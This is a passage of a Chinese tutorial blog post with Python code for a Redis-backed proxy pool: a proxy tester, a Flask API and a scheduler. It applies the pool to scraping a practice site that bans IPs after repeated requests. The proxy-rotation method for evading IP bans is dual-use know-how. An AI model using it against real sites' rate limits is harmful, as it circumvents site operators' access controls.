class="line">                        resp_json = <span class="keyword">await</span> response.json()</span><br><span class="line">                        anonymous_ip = resp_json[<span class="string">&#x27;origin&#x27;</span>]</span><br><span class="line">                    <span class="keyword">assert</span> origin_ip != anonymous_ip</span><br><span class="line">                    <span class="keyword">assert</span> proxy.host == anonymous_ip</span><br><span class="line">                <span class="keyword">async</span> <span class="keyword">with</span> session.get(TEST_URL, proxy=<span class="string">f&#x27;http://<span class="subst">&#123;proxy.string()&#125;</span>&#x27;</span>, timeout=TEST_TIMEOUT,</span><br><span class="line">                                       allow_redirects=<span class="literal">False</span>) <span class="keyword">as</span> response:</span><br><span class="line">                    <span class="keyword">if</span> response.status <span class="keyword">in</span> TEST_VALID_STATUS:</span><br><span class="line">                        self.redis.<span class="built_in">max</span>(proxy)</span><br><span class="line">                        logger.debug(<span class="string">f&#x27;proxy <span class="subst">&#123;proxy.string()&#125;</span> is valid, set max score&#x27;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        self.redis.decrease(proxy)</span><br><span class="line">                        logger.debug(<span class="string">f&#x27;proxy <span class="subst">&#123;proxy.string()&#125;</span> is invalid, decrease score&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> EXCEPTIONS:</span><br><span class="line">                self.redis.decrease(proxy)</span><br><span class="line">                logger.debug(<span class="string">f&#x27;proxy <span class="subst">&#123;proxy.string()&#125;</span> is invalid, decrease score&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @logger.catch</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        test main method</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># event loop of aiohttp</span></span><br><span class="line">        logger.info(<span class="string">&#x27;stating tester...&#x27;</span>)</span><br><span class="line">        count = self.redis.count()</span><br><span class="line">        logger.debug(<span class="string">f&#x27;<span class="subst">&#123;count&#125;</span> proxies to test&#x27;</span>)</span><br><span class="line">        cursor = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            logger.debug(<span class="string">f&#x27;testing proxies use cursor <span class="subst">&#123;cursor&#125;</span>, count <span class="subst">&#123;TEST_BATCH&#125;</span>&#x27;</span>)</span><br><span class="line">            cursor, proxies = self.redis.batch(cursor, count=TEST_BATCH)</span><br><span class="line">            <span class="keyword">if</span> proxies:</span><br><span class="line">                tasks = [self.test(proxy) <span class="keyword">for</span> proxy <span class="keyword">in</span> proxies]</span><br><span class="line">                self.loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> cursor:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_tester</span>():</span></span><br><span class="line">    host = <span class="string">&#x27;96.113.165.182&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;3128&#x27;</span></span><br><span class="line">    tasks = [tester.test(Proxy(host=host, port=port))]</span><br><span class="line">    tester.loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    tester = Tester()</span><br><span class="line">    tester.run()</span><br><span class="line">    <span class="comment"># run_tester()</span></span><br></pre></td></tr></table></figure><p>类<code>Tester</code>中定义了一个异步方法 test，通过 aiohttp 的<code>ClientSession</code> 象的<code>get</code>方法来访问指定页面，根据返回的状态码来判断代理是否有效。如果是通用的代理池，目标链接就设为一个稳定的网站，如百度，一般情况建议指定为目标网站，因为可能代理<code>IP</code>能用，但已经被该网站封禁。<code>TEST_BATCH</code>指定一次性测试的个数，控制内存开销。</p><p><strong>接口模块</strong>使用 <code>Web API</code> 形式暴露可用代理，使用轻量的 Flask 库来实现：</p><p><code>./processors/server.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, g</span><br><span class="line"><span class="keyword">from</span> proxypool.storages.redis <span class="keyword">import</span> RedisClient</span><br><span class="line"><span class="keyword">from</span> proxypool.setting <span class="keyword">import</span> API_HOST, API_PORT, API_THREADED, IS_DEV</span><br><span class="line"></span><br><span class="line">__all__ = [<span class="string">&#x27;app&#x27;</span>]</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> IS_DEV:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_conn</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(g, <span class="string">&#x27;redis&#x27;</span>):</span><br><span class="line">        g.redis = RedisClient()</span><br><span class="line">    <span class="keyword">return</span> g.redis</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h2&gt;Welcome to Proxy Pool System&lt;/h2&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/random&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_proxy</span>():</span></span><br><span class="line">    conn = get_conn()</span><br><span class="line">    <span class="keyword">return</span> conn.random().string()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/all&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_proxy_all</span>():</span></span><br><span class="line">    conn = get_conn()</span><br><span class="line">    proxies = conn.<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> proxies])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/count&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_count</span>():</span></span><br><span class="line">    conn = get_conn()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(conn.count())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=API_HOST, port=API_PORT, threading=API_THREADED)</span><br></pre></td></tr></table></figure><p>4 个模块都定义后，需要一个总的调度模块，通过多进程的方式将它们运行起来，代码如下：</p><p><code>./scheduler.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> proxypool.processors.server <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">from</span> proxypool.processors.getter <span class="keyword">import</span> Getter</span><br><span class="line"><span class="keyword">from</span> proxypool.processors.tester <span class="keyword">import</span> Tester</span><br><span class="line"><span class="keyword">from</span> proxypool.setting <span class="keyword">import</span> APP_PROD_METHOD_GEVENT, APP_PROD_METHOD_MEINHELD, APP_PROD_METHOD_TORNADO, CYCLE_GETTER, \</span><br><span class="line">    CYCLE_TESTER, API_HOST, \</span><br><span class="line">    API_THREADED, API_PORT, ENABLE_SERVER, IS_PROD, APP_PROD_METHOD, \</span><br><span class="line">    ENABLE_GETTER, ENABLE_TESTER, IS_WINDOWS</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> IS_WINDOWS:</span><br><span class="line">    multiprocessing.freeze_support()</span><br><span class="line"></span><br><span class="line">tester_process, getter_process, server_process = <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scheduler</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    scheduler</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_tester</span>(<span class="params">self, cycle=CYCLE_TESTER</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        run tester</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ENABLE_TESTER:</span><br><span class="line">            logger.info(<span class="string">&#x27;tester not enabled, exit&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        tester = Tester()</span><br><span class="line">        loop = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            logger.debug(<span class="string">f&#x27;tester loop <span class="subst">&#123;loop&#125;</span> start...&#x27;</span>)</span><br><span class="line">            tester.run()</span><br><span class="line">            loop += <span class="number">1</span></span><br><span class="line">            time.sleep(cycle)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_getter</span>(<span class="params">self, cycle=CYCLE_GETTER</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        run getter</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ENABLE_GETTER:</span><br><span class="line">            logger.info(<span class="string">&#x27;getter not enabled, exit&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        getter = Getter()</span><br><span class="line">        loop = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            logger.debug(<span class="string">f&#x27;getter loop <span class="subst">&#123;loop&#125;</span> start...&#x27;</span>)</span><br><span class="line">            getter.run()</span><br><span class="line">            loop += <span class="number">1</span></span><br><span class="line">            time.sleep(cycle)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_server</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        run server for api</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ENABLE_SERVER:</span><br><span class="line">            logger.info(<span class="string">&#x27;server not enabled, exit&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> IS_PROD:</span><br><span class="line">            <span class="keyword">if</span> APP_PROD_METHOD == APP_PROD_METHOD_GEVENT:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">from</span> gevent.pywsgi <span class="keyword">import</span> WSGIServer</span><br><span class="line">                <span class="keyword">except</span> ImportError <span class="keyword">as</span> e:</span><br><span class="line">                    logger.exception(e)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    http_server = WSGIServer((API_HOST, API_PORT), app)</span><br><span class="line">                    http_server.serve_forever()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> APP_PROD_METHOD == APP_PROD_METHOD_TORNADO:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">from</span> tornado.wsgi <span class="keyword">import</span> WSGIContainer</span><br><span class="line">                    <span class="keyword">from</span> tornado.httpserver <span class="keyword">import</span> HTTPServer</span><br><span class="line">                    <span class="keyword">from</span> tornado.ioloop <span class="keyword">import</span> IOLoop</span><br><span class="line">                <span class="keyword">except</span> ImportError <span class="keyword">as</span> e:</span><br><span class="line">                    logger.exception(e)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    http_server = HTTPServer(WSGIContainer(app))</span><br><span class="line">                    http_server.listen(API_PORT)</span><br><span class="line">                    IOLoop.instance().start()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> APP_PROD_METHOD == APP_PROD_METHOD_MEINHELD:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">import</span> meinheld</span><br><span class="line">                <span class="keyword">except</span> ImportError <span class="keyword">as</span> e:</span><br><span class="line">                    logger.exception(e)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    meinheld.listen((API_HOST, API_PORT))</span><br><span class="line">                    meinheld.run(app)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                logger.error(<span class="string">&quot;unsupported APP_PROD_METHOD&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            app.run(host=API_HOST, port=API_PORT, threaded=API_THREADED)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">global</span> tester_process, getter_process, server_process</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logger.info(<span class="string">&#x27;starting proxypool...&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> ENABLE_TESTER:</span><br><span class="line">                tester_process = multiprocessing.Process(</span><br><span class="line">                    target=self.run_tester)</span><br><span class="line">                logger.info(<span class="string">f&#x27;starting tester, pid <span class="subst">&#123;tester_process.pid&#125;</span>...&#x27;</span>)</span><br><span class="line">                tester_process.start()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ENABLE_GETTER:</span><br><span class="line">                getter_process = multiprocessing.Process(</span><br><span class="line">                    target=self.run_getter)</span><br><span class="line">                logger.info(<span class="string">f&#x27;starting getter, pid <span class="subst">&#123;getter_process.pid&#125;</span>...&#x27;</span>)</span><br><span class="line">                getter_process.start()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ENABLE_SERVER:</span><br><span class="line">                server_process = multiprocessing.Process(</span><br><span class="line">                    target=self.run_server)</span><br><span class="line">                logger.info(<span class="string">f&#x27;starting server, pid <span class="subst">&#123;server_process.pid&#125;</span>...&#x27;</span>)</span><br><span class="line">                server_process.start()</span><br><span class="line"></span><br><span class="line">            tester_process <span class="keyword">and</span> tester_process.join()</span><br><span class="line">            getter_process <span class="keyword">and</span> getter_process.join()</span><br><span class="line">            server_process <span class="keyword">and</span> server_process.join()</span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            logger.info(<span class="string">&#x27;received keyboard interrupt signal&#x27;</span>)</span><br><span class="line">            tester_process <span class="keyword">and</span> tester_process.terminate()</span><br><span class="line">            getter_process <span class="keyword">and</span> getter_process.terminate()</span><br><span class="line">            server_process <span class="keyword">and</span> server_process.terminate()</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="comment"># must call join method before calling is_alive</span></span><br><span class="line">            tester_process <span class="keyword">and</span> tester_process.join()</span><br><span class="line">            getter_process <span class="keyword">and</span> getter_process.join()</span><br><span class="line">            server_process <span class="keyword">and</span> server_process.join()</span><br><span class="line">            logger.info(</span><br><span class="line">                <span class="string">f&#x27;tester is <span class="subst">&#123;<span class="string">&quot;alive&quot;</span> <span class="keyword">if</span> tester_process.is_alive() <span class="keyword">else</span> <span class="string">&quot;dead&quot;</span>&#125;</span>&#x27;</span>)</span><br><span class="line">            logger.info(</span><br><span class="line">                <span class="string">f&#x27;getter is <span class="subst">&#123;<span class="string">&quot;alive&quot;</span> <span class="keyword">if</span> getter_process.is_alive() <span class="keyword">else</span> <span class="string">&quot;dead&quot;</span>&#125;</span>&#x27;</span>)</span><br><span class="line">            logger.info(</span><br><span class="line">                <span class="string">f&#x27;server is <span class="subst">&#123;<span class="string">&quot;alive&quot;</span> <span class="keyword">if</span> server_process.is_alive() <span class="keyword">else</span> <span class="string">&quot;dead&quot;</span>&#125;</span>&#x27;</span>)</span><br><span class="line">            logger.info(<span class="string">&#x27;proxy terminated&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    scheduler = Scheduler()</span><br><span class="line">    scheduler.run()</span><br></pre></td></tr></table></figure><p>设定了各个模块的开关常量、检测休眠时间常量等，还预设了三个 Web 异步框架供选择。</p><p>获取代理的示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">PROXY_POOL_URL = <span class="string">&#x27;http://localhost:5555/random&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_proxy</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(PROXY_POOL_URL)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> ConnectionError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>下面以一个反爬网站示例来进行实战，该网站限制单个 IP 每5分钟最多访问 10 次，超过则会封禁此 IP，并返回 403 状态码，10 分钟后解锁。</p><p>由于无法判断某个代理失败原因是被网站封禁还是代理本身失效，为了保证正常爬取，需要添加重试机制，这里维护一个 Redis 爬取队列，实现异常处理，将失败请求重新加入队列。</p><p>既然要用队列存储结构，就需要实现一个请求的数据结构，包含请求链接、请求头、请求方式和超时时间等，还需要一个回调函数 callback，我们可以采用继承 Request 对象来实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .config <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MovieRequest</span>(<span class="params">Request</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url, callback, method=<span class="string">&quot;GET&quot;</span>, headers=<span class="literal">None</span>, fail_time=<span class="number">0</span>, timeout=TIMEOUT</span>):</span></span><br><span class="line">        Request.__init__(self, method, url, headers)</span><br><span class="line">        self.callback = callback</span><br><span class="line">        self.fail_time = fail_time</span><br><span class="line">        self.timeout = timeout</span><br></pre></td></tr></table></figure><p>请求的存取通过 Redis 的 rpush 方法和 lpop 方法，另外，存 Request 对象前需要先序列化，取出来时要进行反序列化，因为 Redis 中存的是字符串，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> StrictRedis</span><br><span class="line"><span class="keyword">from</span> .config <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> dumps, loads</span><br><span class="line"><span class="keyword">from</span> .request <span class="keyword">import</span> MovieRequest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisQueue</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        init redis connection</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.db = StrictRedis(</span><br><span class="line">            host=REDIS_HOST, port=REDIS_PORT, password=REDIS_PASSWORD)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">self, request</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        add request to queue</span></span><br><span class="line"><span class="string">        :param request: request</span></span><br><span class="line"><span class="string">        :param fail_time: fail times</span></span><br><span class="line"><span class="string">        :return: result</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(request, MovieRequest):</span><br><span class="line">            <span class="keyword">return</span> self.db.rpush(REDIS_KEY, dumps(request))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        get next request</span></span><br><span class="line"><span class="string">        :return: Request or None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.db.llen(REDIS_KEY):</span><br><span class="line">            <span class="keyword">return</span> loads(self.db.lpop(REDIS_KEY))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clear</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.db.delete(REDIS_KEY)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">empty</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.db.llen(REDIS_KEY) == <span class="number">0</span></span><br></pre></td></tr></table></figure><p>构造请求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">from</span> .db <span class="keyword">import</span> RedisQueue</span><br><span class="line"><span class="keyword">from</span> .request <span class="keyword">import</span> MovieRequest</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&#x27;https://antispider5.scrape.center/&#x27;</span></span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span>():</span></span><br><span class="line">    session = Session()</span><br><span class="line">    queue = RedisQueue()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @logger.catch</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_proxy</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        get proxy from proxypool</span></span><br><span class="line"><span class="string">        :return: proxy</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        response = requests.get(PROXY_POOL_URL)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            logger.debug(<span class="string">f&#x27;get proxy <span class="subst">&#123;response.text&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span 